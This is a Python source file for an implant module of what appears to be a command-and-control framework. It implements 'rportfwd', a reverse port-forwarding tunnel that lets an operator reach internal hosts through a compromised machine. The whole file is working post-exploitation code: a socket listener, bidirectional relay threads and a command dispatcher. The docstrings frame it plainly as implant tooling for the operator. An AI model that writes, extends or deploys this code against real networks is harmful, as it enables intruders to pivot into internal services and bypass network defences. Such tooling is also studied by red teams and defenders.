"""Reverse port forwarding — expose a remote internal service back to the operator.
The implant connects to an internal host:port and tunnels all traffic through
the C2 channel back to a local listener on the operator's machine."""

import socket
import threading
import select
import time
from typing import Optional


class ReverseForward:
    """Creates a reverse tunnel: implant connects to target_host:target_port,
    then relays bidirectional traffic through a local proxy on the implant
    that the operator can connect to."""

    def __init__(self):
        self._tunnels: dict[str, TunnelPair] = {}

    def create(
        self,
        tunnel_id: str,
        local_port: int,
        remote_host: str,
        remote_port: int,
        bind_addr: str = "127.0.0.1",
    ) -> str:
        """Create a reverse forward tunnel."""
        if tunnel_id in self._tunnels:
            return f"Tunnel '{tunnel_id}' already exists"

        tunnel = TunnelPair(bind_addr, local_port, remote_host, remote_port)
        try:
            tunnel.start()
            self._tunnels[tunnel_id] = tunnel
            return f"Tunnel '{tunnel_id}' active: {bind_addr}:{local_port} -> {remote_host}:{remote_port}"
        except Exception as e:
            return f"Tunnel creation failed: {e}"

    def remove(self, tunnel_id: str) -> str:
        """Close and remove a tunnel."""
        tunnel = self._tunnels.pop(tunnel_id, None)
        if tunnel is None:
            return f"Tunnel '{tunnel_id}' not found"
        tunnel.stop()
        return f"Tunnel '{tunnel_id}' closed"

    def list_tunnels(self) -> str:
        if not self._tunnels:
            return "No active tunnels"
        lines = []
        for tid, tunnel in self._tunnels.items():
            lines.append(f"  {tid}: {tunnel.bind_addr}:{tunnel.local_port} -> {tunnel.remote_host}:{tunnel.remote_port} [{tunnel.status}]")
        return "\n".join(lines)


class TunnelPair:
    """One reverse tunnel: local listener -> remote connection."""

    def __init__(self, bind_addr: str, local_port: int, remote_host: str, remote_port: int):
        self.bind_addr = bind_addr
        self.local_port = local_port
        self.remote_host = remote_host
        self.remote_port = remote_port
        self._running = False
        self._listener: Optional[socket.socket] = None
        self._active_conns = 0
        self.status = "created"

    def start(self):
        self._running = True
        self._listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._listener.settimeout(1.0)
        self._listener.bind((self.bind_addr, self.local_port))
        self._listener.listen(5)
        self.status = "listening"

        accept_thread = threading.Thread(target=self._accept_loop, daemon=True)
        accept_thread.start()

    def stop(self):
        self._running = False
        self.status = "stopped"
        if self._listener:
            self._listener.close()

    def _accept_loop(self):
        while self._running:
            try:
                local_sock, addr = self._listener.accept()
                self._active_conns += 1
                relay_thread = threading.Thread(
                    target=self._relay, args=(local_sock,), daemon=True
                )
                relay_thread.start()
            except socket.timeout:
                continue
            except OSError:
                break

    def _relay(self, local_sock: socket.socket):
        """Connect to the remote target and relay bidirectionally."""
        remote_sock = None
        try:
            remote_sock = socket.create_connection((self.remote_host, self.remote_port), timeout=10)

            socks = [local_sock, remote_sock]
            while self._running:
                try:
                    readable, _, exceptional = select.select(socks, [], socks, 5.0)
                    if exceptional:
                        break
                    for sock in readable:
                        data = sock.recv(65536)
                        if not data:
                            return
                        if sock is local_sock:
                            remote_sock.sendall(data)
                        else:
                            local_sock.sendall(data)
                except (socket.timeout, OSError):
                    break
        except Exception:
            pass
        finally:
            self._active_conns -= 1
            for sock in (local_sock, remote_sock):
                if sock:
                    try:
                        sock.shutdown(socket.SHUT_RDWR)
                    except OSError:
                        pass
                    try:
                        sock.close()
                    except OSError:
                        pass


# Module-level singleton
_forwarder = ReverseForward()


def run(args: list[str]) -> str:
    """Module entry point.

    Usage:
        rportfwd create <id> <local_port> <remote_host> <remote_port>
        rportfwd remove <id>
        rportfwd list
    """
    if not args:
        return "Usage: rportfwd create|remove|list"

    cmd = args[0].lower()

    if cmd == "create":
        if len(args) < 5:
            return "Usage: rportfwd create <id> <local_port> <remote_host> <remote_port>"
        return _forwarder.create(args[1], int(args[2]), args[3], int(args[4]))
    elif cmd == "remove":
        if len(args) < 2:
            return "Usage: rportfwd remove <id>"
        return _forwarder.remove(args[1])
    elif cmd == "list":
        return _forwarder.list_tunnels()
    else:
        return f"Unknown command: {cmd}"
